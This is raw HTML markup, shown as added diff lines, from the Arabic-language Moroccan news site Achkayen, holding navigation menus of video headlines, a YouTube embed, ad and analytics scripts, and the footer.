+<script>var bs_ajax_paginate_329696891 = '{"query":{"paginate":"next_prev","show_label":1,"order_by":"date","count":4,"category":"20","_layout":{"state":"1|1|0","page":"1-col"}},"type":"wp_query","view":"Publisher::bs_pagin_ajax_mega_grid_posts","current_page":1,"ajax_url":"\/wp-admin\/admin-ajax.php","remove_duplicates":"0","paginate":"next_prev","_layout":{"state":"1|1|0","page":"1-col"},"_bs_pagin_token":"fbb7a49"}';</script>				<a class="btn-bs-pagination prev disabled" rel="prev" data-id="329696891"
+title="السابق">
+<i class="fa fa-angle-right"
+aria-hidden="true"></i> السابق				</a>
+<a  rel="next" class="btn-bs-pagination next"
+data-id="329696891" title="التالي">
+التالي <i
+class="fa fa-angle-left" aria-hidden="true"></i>
+</a>
+</div>		</div>
+</div>
+<!-- Mega Menu End -->
+</li>
+<li id="menu-item-1828" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-8 better-anim-fade menu-item-has-children menu-item-has-mega menu-item-mega-grid-posts menu-item-1828"><a href="https://www.achkayen.com/category/%d9%81%d9%8a%d8%af%d9%8a%d9%88%d9%87%d8%a7%d8%aa-%d9%85%d8%ae%d8%aa%d8%a7%d8%b1%d8%a9">الفيديوتيك</a>
+<!-- Mega Menu Start -->
+<div class="mega-menu mega-grid-posts">
+<div class="content-wrap bs-tab-anim bs-tab-animated active">
+<div class="bs-pagination-wrapper main-term-8 next_prev ">
+<div class="listing listing-grid listing-grid-1 clearfix columns-4">
+<div class="post-595166 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-17095">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-17095"><a href="https://www.achkayen.com/category/24-%d8%b3%d8%a7%d8%b9%d8%a9">24 ساعة</a></span></div>				<a  title="مستجدات قضية مول sh" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/Capture-decran-2024-12-25-094603.png?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/Capture-decran-2024-12-25-094603-750x430.png"						class="img-holder" href="https://www.achkayen.com/595166/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/595166/.html" class="post-title post-url">
+مستجدات قضية مول sh		</a>
+</p>	</div>
+</div >
+<div class="post-595028 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-17095">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-17095"><a href="https://www.achkayen.com/category/24-%d8%b3%d8%a7%d8%b9%d8%a9">24 ساعة</a></span></div>				<a  title="التوفيق..&#8221;الهبة للبنات دون إشتراط الحيازة&#8221;" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-24-at-13.49.29-1.jpeg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-24-at-13.49.29-1-750x430.jpeg"						class="img-holder" href="https://www.achkayen.com/595028/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/595028/.html" class="post-title post-url">
+التوفيق..&#8221;الهبة للبنات دون إشتراط الحيازة&#8221;		</a>
+</p>	</div>
+</div >
+<div class="post-595008 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-17095">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-17095"><a href="https://www.achkayen.com/category/24-%d8%b3%d8%a7%d8%b9%d8%a9">24 ساعة</a></span></div>				<a  title="الكشف عن تعديلات مدونة الأسرة" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-24-at-13.49.29.jpeg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-24-at-13.49.29-750x430.jpeg"						class="img-holder" href="https://www.achkayen.com/595008/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/595008/.html" class="post-title post-url">
+الكشف عن تعديلات مدونة الأسرة		</a>
+</p>	</div>
+</div >
+<div class="post-594959 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-17095">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-17095"><a href="https://www.achkayen.com/category/24-%d8%b3%d8%a7%d8%b9%d8%a9">24 ساعة</a></span></div>				<a  title="صرخة تجار سوق الصالحين بسلا" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-23-at-17.18.50.jpeg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-23-at-17.18.50-750x430.jpeg"						class="img-holder" href="https://www.achkayen.com/594959/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/594959/.html" class="post-title post-url">
+صرخة تجار سوق الصالحين بسلا		</a>
+</p>	</div>
+</div >
+</div>
+</div><div class="bs-pagination bs-ajax-pagination next_prev main-term-8 clearfix">
+<script>var bs_ajax_paginate_1820050839 = '{"query":{"paginate":"next_prev","show_label":1,"order_by":"date","count":4,"category":"8","_layout":{"state":"1|1|0","page":"1-col"}},"type":"wp_query","view":"Publisher::bs_pagin_ajax_mega_grid_posts","current_page":1,"ajax_url":"\/wp-admin\/admin-ajax.php","remove_duplicates":"0","paginate":"next_prev","_layout":{"state":"1|1|0","page":"1-col"},"_bs_pagin_token":"1dc1bf4"}';</script>				<a class="btn-bs-pagination prev disabled" rel="prev" data-id="1820050839"
+title="السابق">
+<i class="fa fa-angle-right"
+aria-hidden="true"></i> السابق				</a>
+<a  rel="next" class="btn-bs-pagination next"
+data-id="1820050839" title="التالي">
+التالي <i
+class="fa fa-angle-left" aria-hidden="true"></i>
+</a>
+</div>		</div>
+</div>
+<!-- Mega Menu End -->
+</li>
+<li id="menu-item-226" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-11 better-anim-fade menu-item-226"><a href="https://www.achkayen.com/category/%d8%b1%d9%8a%d8%a7%d8%b6%d8%a9">رياضة</a></li>
+<li id="menu-item-976" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-24 better-anim-fade menu-item-976"><a href="https://www.achkayen.com/category/%d8%a7%d9%84%d9%85%d8%b1%d8%a3%d8%a9">المرأة</a></li>
+<li id="menu-item-225" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-term-9 better-anim-fade menu-item-225"><a href="https://www.achkayen.com/category/%d9%85%d8%ac%d8%aa%d9%85%d8%b9">مجتمع</a>
+<ul class="sub-menu">
+<li id="menu-item-222" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-5 better-anim-fade menu-item-222"><a href="https://www.achkayen.com/category/%d8%ac%d9%87%d8%a7%d8%aa">جهات</a></li>
+<li id="menu-item-977" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-31 better-anim-fade menu-item-977"><a href="https://www.achkayen.com/category/%d9%81%d9%86-%d9%88%d8%ab%d9%82%d8%a7%d9%81%d8%a9">فن وثقافة</a></li>
+<li id="menu-item-1365" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-33 better-anim-fade menu-item-1365"><a href="https://www.achkayen.com/category/%d9%85%d9%86%d9%88%d8%b9%d8%a7%d8%aa">منوعات</a></li>
+</ul>
+</li>
+<li id="menu-item-227" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-term-12 better-anim-fade menu-item-227"><a href="https://www.achkayen.com/category/%d8%b9%d8%a7%d9%84%d9%85">دولي</a>
+<ul class="sub-menu">
+<li id="menu-item-228" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-10 better-anim-fade menu-item-228"><a href="https://www.achkayen.com/category/%d9%85%d8%ba%d8%a7%d8%b1%d8%a8%d8%a9-%d8%a7%d9%84%d8%b9%d8%a7%d9%84%d9%85">مغاربة العالم</a></li>
+</ul>
+</li>
+<li id="menu-item-967" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-has-children menu-term-26 better-anim-fade menu-item-967"><a href="https://www.achkayen.com/category/%d8%a3%d8%ac%d9%86%d8%a7%d8%b3-%d9%83%d8%a8%d8%b1%d9%89">جناس كبرى</a>
+<ul class="sub-menu">
+<li id="menu-item-970" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-27 better-anim-fade menu-item-970"><a href="https://www.achkayen.com/category/%d8%a3%d8%ac%d9%86%d8%a7%d8%b3-%d9%83%d8%a8%d8%b1%d9%89/%d8%ad%d9%88%d8%a7%d8%b1">حوار</a></li>
+<li id="menu-item-969" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-28 better-anim-fade menu-item-969"><a href="https://www.achkayen.com/category/%d8%a3%d8%ac%d9%86%d8%a7%d8%b3-%d9%83%d8%a8%d8%b1%d9%89/%d8%aa%d8%ad%d9%82%d9%8a%d9%82">تحقيق</a></li>
+<li id="menu-item-971" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-29 better-anim-fade menu-item-971"><a href="https://www.achkayen.com/category/%d8%a3%d8%ac%d9%86%d8%a7%d8%b3-%d9%83%d8%a8%d8%b1%d9%89/%d8%b1%d9%88%d8%a8%d9%88%d8%b1%d8%aa%d8%a7%d8%ac">روبورتاج</a></li>
+<li id="menu-item-968" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-30 better-anim-fade menu-item-968"><a href="https://www.achkayen.com/category/%d8%a3%d8%ac%d9%86%d8%a7%d8%b3-%d9%83%d8%a8%d8%b1%d9%89/%d8%a8%d9%88%d8%b1%d8%aa%d8%b1%d9%8a%d9%87">بورتريه</a></li>
+<li id="menu-item-16171" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-292 better-anim-fade menu-item-16171"><a href="https://www.achkayen.com/category/%d8%b6%d9%8a%d9%81-%d8%a7%d9%84%d8%b3%d8%a8%d8%aa">ضيف السبت</a></li>
+<li id="menu-item-16170" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-293 better-anim-fade menu-item-16170"><a href="https://www.achkayen.com/category/%d8%b6%d9%8a%d9%81-%d8%a7%d9%84%d8%a3%d8%ad%d8%af">ضيف الأحد</a></li>
+</ul>
+</li>
+<li id="menu-item-221" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-4 better-anim-fade menu-item-221"><a href="https://www.achkayen.com/category/%d8%a5%d9%82%d8%aa%d8%b5%d8%a7%d8%af">مال وأعمال</a></li>
+<li id="menu-item-1839" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-21 better-anim-fade menu-item-1839"><a href="https://www.achkayen.com/category/%d9%83%d9%8f%d8%aa%d9%91%d8%a7%d8%a8-%d9%88%d8%a2%d8%b1%d8%a7%d8%a1">كُتّاب وآراء</a></li>
+<li id="menu-item-1361" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-18 better-anim-fade menu-item-has-children menu-item-has-mega menu-item-mega-grid-posts menu-item-1361"><a href="https://www.achkayen.com/category/%d8%a3%d8%b4%d9%83%d8%a7%d9%8a%d9%86-%d8%aa%d9%8a%d9%81%d9%8a">آشكاين TV</a>
+<!-- Mega Menu Start -->
+<div class="mega-menu mega-grid-posts">
+<div class="content-wrap bs-tab-anim bs-tab-animated active">
+<div class="bs-pagination-wrapper main-term-18 next_prev ">
+<div class="listing listing-grid listing-grid-1 clearfix columns-4">
+<div class="post-588441 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-18">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-18"><a href="https://www.achkayen.com/category/%d8%a3%d8%b4%d9%83%d8%a7%d9%8a%d9%86-%d8%aa%d9%8a%d9%81%d9%8a">تيفي آشكاين</a></span></div>				<a  title="كلمة ذ.محمد رفقي في الذكرى الستين لإنشاء المسجد الكبير بداكار" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/P1035931-scaled.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/P1035931-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/588441/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/588441/.html" class="post-title post-url">
+كلمة ذ.محمد رفقي في الذكرى الستين لإنشاء المسجد الكبير بداكار		</a>
+</p>	</div>
+</div >
+<div class="post-585416 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-18">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-18"><a href="https://www.achkayen.com/category/%d8%a3%d8%b4%d9%83%d8%a7%d9%8a%d9%86-%d8%aa%d9%8a%d9%81%d9%8a">تيفي آشكاين</a></span></div>				<a  title="حموشي يستلم علم الإنتربول" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/Screenshot_20241107_212055.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/Screenshot_20241107_212055-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/585416/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/585416/.html" class="post-title post-url">
+حموشي يستلم علم الإنتربول		</a>
+</p>	</div>
+</div >
+<div class="post-585113 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-18">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-18"><a href="https://www.achkayen.com/category/%d8%a3%d8%b4%d9%83%d8%a7%d9%8a%d9%86-%d8%aa%d9%8a%d9%81%d9%8a">تيفي آشكاين</a></span></div>				<a  title="الخطاب الملكي بمناسبة ذكرى المسيرة الخضراء" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/IMG-20241106-WA0108.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/11/IMG-20241106-WA0108-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/585113/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/585113/.html" class="post-title post-url">
+الخطاب الملكي بمناسبة ذكرى المسيرة الخضراء		</a>
+</p>	</div>
+</div >
+<div class="post-584315 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-18">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-18"><a href="https://www.achkayen.com/category/%d8%a3%d8%b4%d9%83%d8%a7%d9%8a%d9%86-%d8%aa%d9%8a%d9%81%d9%8a">تيفي آشكاين</a></span></div>				<a  title="عبقرية ملك" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/10/WhatsApp-Image-2024-10-31-at-12.48.48.jpeg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/10/WhatsApp-Image-2024-10-31-at-12.48.48-750x430.jpeg"						class="img-holder" href="https://www.achkayen.com/584315/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/584315/.html" class="post-title post-url">
+عبقرية ملك		</a>
+</p>	</div>
+</div >
+</div>
+</div><div class="bs-pagination bs-ajax-pagination next_prev main-term-18 clearfix">
+<script>var bs_ajax_paginate_896662240 = '{"query":{"paginate":"next_prev","show_label":1,"order_by":"date","count":4,"category":"18","_layout":{"state":"1|1|0","page":"1-col"}},"type":"wp_query","view":"Publisher::bs_pagin_ajax_mega_grid_posts","current_page":1,"ajax_url":"\/wp-admin\/admin-ajax.php","remove_duplicates":"0","paginate":"next_prev","_layout":{"state":"1|1|0","page":"1-col"},"_bs_pagin_token":"e125afb"}';</script>				<a class="btn-bs-pagination prev disabled" rel="prev" data-id="896662240"
+title="السابق">
+<i class="fa fa-angle-right"
+aria-hidden="true"></i> السابق				</a>
+<a  rel="next" class="btn-bs-pagination next"
+data-id="896662240" title="التالي">
+التالي <i
+class="fa fa-angle-left" aria-hidden="true"></i>
+</a>
+</div>		</div>
+</div>
+<!-- Mega Menu End -->
+</li>
+</ul><!-- #main-navigation -->
+<div class="menu-action-buttons width-2">
+<div class="off-canvas-menu-icon-container off-icon-left">
+<div class="off-canvas-menu-icon">
+<div class="off-canvas-menu-icon-el"></div>
+</div>
+</div>
+<div class="search-container close">
+<span class="search-handler"><i class="fa fa-search"></i></span>
+<div class="search-box clearfix">
+<form role="search" method="get" class="search-form clearfix" action="https://www.achkayen.com">
+<input type="search" class="search-field"
+placeholder="بحث..."
+value="" name="s"
+title="البحث عن:"
+autocomplete="off">
+<input type="submit" class="search-submit" value="بحث">
+</form><!-- .search-form -->
+</div>
+</div>
+</div>
+</nav><!-- .main-menu-container -->
+</div>
+</div>
+</div>
+</div><!-- .menu -->
+<iframe width="100%" height="500" 
+        src="https://www.youtube.com/embed/IIUH-kzaNXU" 
+        frameborder="0" 
+        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
+        allowfullscreen>
+</iframe>
+</header>
+
+<div class="container adcontainer"><div class="xfquciwb xfquciwb-before-footer xfquciwb-pubadban xfquciwb-show-desktop xfquciwb-show-tablet-portrait xfquciwb-show-tablet-landscape xfquciwb-show-phone xfquciwb-loc-footer_before xfquciwb-align-center xfquciwb-column-1 xfquciwb-clearfix no-bg-box-model"><div id="xfquciwb-30263-637419536" class="xfquciwb-container xfquciwb-type-code " itemscope="" itemtype="https://schema.org/WPAdBlock" data-adid="30263" data-type="code"><div id="xfquciwb-30263-637419536-place"></div><script type="text/javascript">var betterads_screen_width = document.body.clientWidth;betterads_el = document.getElementById('xfquciwb-30263-637419536');             if (betterads_el.getBoundingClientRect().width) {     betterads_el_width_raw = betterads_el_width = betterads_el.getBoundingClientRect().width;    } else {     betterads_el_width_raw = betterads_el_width = betterads_el.offsetWidth;    }        var size = ["125", "125"];    if ( betterads_el_width >= 728 )      betterads_el_width = ["728", "90"];    else if ( betterads_el_width >= 468 )     betterads_el_width = ["468", "60"];    else if ( betterads_el_width >= 336 )     betterads_el_width = ["336", "280"];    else if ( betterads_el_width >= 300 )     betterads_el_width = ["300", "250"];    else if ( betterads_el_width >= 250 )     betterads_el_width = ["250", "250"];    else if ( betterads_el_width >= 200 )     betterads_el_width = ["200", "200"];    else if ( betterads_el_width >= 180 )     betterads_el_width = ["180", "150"]; if ( betterads_screen_width >= 1140 ) { document.getElementById('xfquciwb-30263-637419536-place').innerHTML = '<ins class="adsbygoogle" style="display:block;"  data-ad-client="ca-pub-5424065308523769"  data-ad-slot="4987324998"  data-full-width-responsive="true"  data-ad-format="auto" ></ins>';         (adsbygoogle = window.adsbygoogle || []).push({});}else if ( betterads_screen_width >= 1019  && betterads_screen_width < 1140 ) { document.getElementById('xfquciwb-30263-637419536-place').innerHTML = '<ins class="adsbygoogle" style="display:block;"  data-ad-client="ca-pub-5424065308523769"  data-ad-slot="4987324998"  data-full-width-responsive="true"  data-ad-format="auto" ></ins>';         (adsbygoogle = window.adsbygoogle || []).push({});}else if ( betterads_screen_width >= 768  && betterads_screen_width < 1019 ) { document.getElementById('xfquciwb-30263-637419536-place').innerHTML = '<ins class="adsbygoogle" style="display:block;"  data-ad-client="ca-pub-5424065308523769"  data-ad-slot="4987324998"  data-full-width-responsive="true"  data-ad-format="auto" ></ins>';         (adsbygoogle = window.adsbygoogle || []).push({});}else if ( betterads_screen_width < 768 ) { document.getElementById('xfquciwb-30263-637419536-place').innerHTML = '<ins class="adsbygoogle" style="display:block;"  data-ad-client="ca-pub-5424065308523769"  data-ad-slot="4987324998"  data-full-width-responsive="true"  data-ad-format="auto" ></ins>';         (adsbygoogle = window.adsbygoogle || []).push({});}</script></div></div></div>	<footer id="site-footer" class="site-footer full-width">
+<div class="copy-footer">
+<div class="content-wrap">
+<div class="container">
+<div class="row">
+<div class="col-lg-12">
+<div id="menu-footer" class="menu footer-menu-wrapper" role="navigation" itemscope="itemscope" itemtype="https://schema.org/SiteNavigationElement">
+<nav class="footer-menu-container">
+
+</nav>
+</div>
+</div>
+</div>
+<div class="row footer-copy-row">
+<div class="copy-1 col-lg-6 col-md-6 col-sm-6 col-xs-12">
+2024 © - أشكاين جميع الحقوق محفوظة						</div>
+<div class="copy-2 col-lg-6 col-md-6 col-sm-6 col-xs-12">
+</div>
+</div>
+</div>
+</div>
+</div>
+</footer><!-- .footer -->
+</div><!-- .main-wrap -->
+<div class="bs-wrap-gdpr-law bs-wrap-gdpr-law-close">
+<div class="bs-gdpr-law">
+<p>
+يستخدم موقع الويب هذا ملفات تعريف الارتباط لتحسين تجربتك. سنفترض أنك موافق على هذا ، ولكن يمكنك إلغاء الاشتراك إذا كنت ترغب في ذلك.
+<a class="bs-gdpr-accept" href="#"
+data-cookie="show">قبول</a>
+<a class="bs-gdpr-more"
+href="https://www.achkayen.com/%D9%85%D9%86-%D9%86%D8%AD%D9%86">قراءة المزيد</a>
+</p>
+</div>
+</div>
+<span class="back-top"><i class="fa fa-arrow-up"></i></span>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-111836817-1"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-111836817-1');
+</script>
+<script type="text/html" id="wpb-modifications"> window.wpbCustomElement = 1; </script><script type="text/javascript">/* <![CDATA[ */ jQuery(document).ready( function() { jQuery.post( "https://www.achkayen.com/wp-admin/admin-ajax.php", { action : "entry_views", _ajax_nonce : "2054daf780", post_id : 119 } ); } ); /* ]]> */</script>
+<script type="text/javascript" id="publisher-theme-pagination-js-extra">
+/* <![CDATA[ */
+var bs_pagination_loc = {"loading":"<div class=\"bs-loading\"><div><\/div><div><\/div><div><\/div><div><\/div><div><\/div><div><\/div><div><\/div><div><\/div><div><\/div><\/div>"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="publisher-js-extra">
+/* <![CDATA[ */
+var publisher_theme_global_loc = {"page":{"boxed":"boxed"},"header":{"style":"style-2","boxed":"full-width"},"ajax_url":"https:\/\/www.achkayen.com\/wp-admin\/admin-ajax.php","loading":"<div class=\"bs-loading\"><div><\/div><div><\/div><div><\/div><div><\/div><div><\/div><div><\/div><div><\/div><div><\/div><div><\/div><\/div>","translations":{"tabs_all":"\u0627\u0644\u0643\u0644","tabs_more":"\u0627\u0644\u0645\u0632\u064a\u062f","lightbox_expand":"\u0642\u0645 \u0628\u062a\u0648\u0633\u064a\u0639 \u0627\u0644\u0635\u0648\u0631\u0629","lightbox_close":"\u0623\u063a\u0644\u0642"},"lightbox":{"not_classes":""},"main_menu":{"more_menu":"disable"},"top_menu":{"more_menu":"enable"},"skyscraper":{"sticky_gap":30,"sticky":false,"position":""},"share":{"more":true},"refresh_googletagads":"1","get_locale":"ar","notification":{"subscribe_msg":"\u0645\u0646 \u062e\u0644\u0627\u0644 \u0627\u0644\u0646\u0642\u0631 \u0639\u0644\u0649 \u0632\u0631 \u0627\u0644\u0627\u0634\u062a\u0631\u0627\u0643 \u0644\u0646 \u062a\u0641\u0648\u062a\u0643 \u0627\u0644\u0645\u0642\u0627\u0644\u0627\u062a \u0627\u0644\u062c\u062f\u064a\u062f\u0629!","subscribed_msg":"\u0623\u0646\u062a \u0645\u0634\u062a\u0631\u0643 \u0641\u064a \u0627\u0644\u0625\u0634\u0639\u0627\u0631\u0627\u062a","subscribe_btn":"\u0627\u0634\u062a\u0631\u0643 \u0627\u0644\u0622\u0646","subscribed_btn":"\u0625\u0644\u063a\u0627\u0621 \u0627\u0644\u0627\u0634\u062a\u0631\u0627\u0643"}};
+var publisher_theme_ajax_search_loc = {"ajax_url":"https:\/\/www.achkayen.com\/wp-admin\/admin-ajax.php","previewMarkup":"<div class=\"ajax-search-results-wrapper ajax-search-no-product ajax-search-fullwidth\">\n\t<div class=\"ajax-search-results\">\n\t\t<div class=\"ajax-ajax-posts-list\">\n\t\t\t<div class=\"clean-title heading-typo\">\n\t\t\t\t<span>\u0627\u0644\u0645\u0634\u0627\u0631\u0643\u0627\u062a<\/span>\n\t\t\t<\/div>\n\t\t\t<div class=\"posts-lists\" data-section-name=\"posts\"><\/div>\n\t\t<\/div>\n\t\t<div class=\"ajax-taxonomy-list\">\n\t\t\t<div class=\"ajax-categories-columns\">\n\t\t\t\t<div class=\"clean-title heading-typo\">\n\t\t\t\t\t<span>\u0627\u0644\u062a\u0635\u0646\u064a\u0641\u0627\u062a<\/span>\n\t\t\t\t<\/div>\n\t\t\t\t<div class=\"posts-lists\" data-section-name=\"categories\"><\/div>\n\t\t\t<\/div>\n\t\t\t<div class=\"ajax-tags-columns\">\n\t\t\t\t<div class=\"clean-title heading-typo\">\n\t\t\t\t\t<span>\u0627\u0644\u0648\u0633\u0648\u0645<\/span>\n\t\t\t\t<\/div>\n\t\t\t\t<div class=\"posts-lists\" data-section-name=\"tags\"><\/div>\n\t\t\t<\/div>\n\t\t<\/div>\n\t<\/div>\n<\/div>","full_width":"1"};
+/* ]]> */
+</script>
+<div class="rh-cover noscroll  no-login-icon" style="background-color: #012d8c">
+<span class="rh-close"></span>
+<div class="rh-panel rh-pm">
+<div class="rh-p-h">
+</div>
+<div class="rh-p-b">
+<div class="rh-c-m clearfix"><ul id="resp-navigation" class="resp-menu menu clearfix"><li class="menu-have-icon menu-icon-type-custom-icon menu-icon-type-fontawesome menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-title-hide better-anim-fade menu-item-229"><a href="https://www.achkayen.com" aria-current="page"><i class="bf-icon bf-custom-icon "><img style="max-width:25px" src="https://www.achkayen.com/wp-content/uploads/2018/03/Icon-achkayen-2018.png"></i><span class="hidden">الرئيسية</span></a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-291 better-anim-fade menu-item-16168"><a href="https://www.achkayen.com/category/%d9%85%d9%88%d9%82%d9%81">آشكاين موقف</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-6 better-anim-fade menu-item-223"><a href="https://www.achkayen.com/category/%d8%b3%d9%8a%d8%a7%d8%b3%d8%a9">سياسة</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-term-20 better-anim-fade menu-item-has-children menu-item-has-mega menu-item-mega-grid-posts menu-item-1364"><a href="https://www.achkayen.com/category/%d8%a5%d9%81%d8%aa%d8%aa%d8%a7%d8%ad%d9%8a%d8%a9">إفتتاحية التيجيني</a>
+<!-- Mega Menu Start -->
+<div class="mega-menu mega-grid-posts">
+<div class="content-wrap bs-tab-anim bs-tab-animated active">
+<div class="bs-pagination-wrapper main-term-20 next_prev ">
+<div class="listing listing-grid listing-grid-1 clearfix columns-4">
+<div class="post-594022 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-2">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-2"><a href="https://www.achkayen.com/category/%d8%a2%d8%ae%d8%b1-%d8%a7%d9%84%d8%a3%d8%ae%d8%a8%d8%a7%d8%b1">آخر الأخبار</a></span></div>				<a  title="التيجيني يكشف خلفيات استيراد اللحوم من الخارج (فيديو)" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-18-at-16.05.57-scaled.jpeg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/WhatsApp-Image-2024-12-18-at-16.05.57-750x430.jpeg"						class="img-holder" href="https://www.achkayen.com/594022/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/594022/.html" class="post-title post-url">
+التيجيني يكشف خلفيات استيراد اللحوم من الخارج (فيديو)		</a>
+</p>	</div>
+</div >
+<div class="post-592869 type-post format-video has-post-thumbnail  simple-grid  listing-item listing-item-grid listing-item-grid-1 main-term-2">
+<div class="item-inner">
+<div class="featured clearfix">
+<div class="term-badges floated"><span class="term-badge term-2"><a href="https://www.achkayen.com/category/%d8%a2%d8%ae%d8%b1-%d8%a7%d9%84%d8%a3%d8%ae%d8%a8%d8%a7%d8%b1">آخر الأخبار</a></span></div>				<a  title="التيجيني: أحرار الجزائر يستنجدون بالمغرب (فيديو)" style="background-image: url(https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/IMG-20241214-WA0050.jpg?resize=357%2C210&ssl=1);" data-bsrjs="https://i0.wp.com/www.achkayen.com/wp-content/uploads/2024/12/IMG-20241214-WA0050-750x430.jpg"						class="img-holder" href="https://www.achkayen.com/592869/.html"></a>
+<span class="format-icon format-video"><i class="fa fa-play"></i></span>			</div>
+<p class="title">		<a href="https://www.achkayen.com/592869/.html" class="post-title post-url">
+التيجيني: أحرار الجزائر يستنجدون بالمغرب (فيديو)		</a>
+</p>	</div>
+</div >
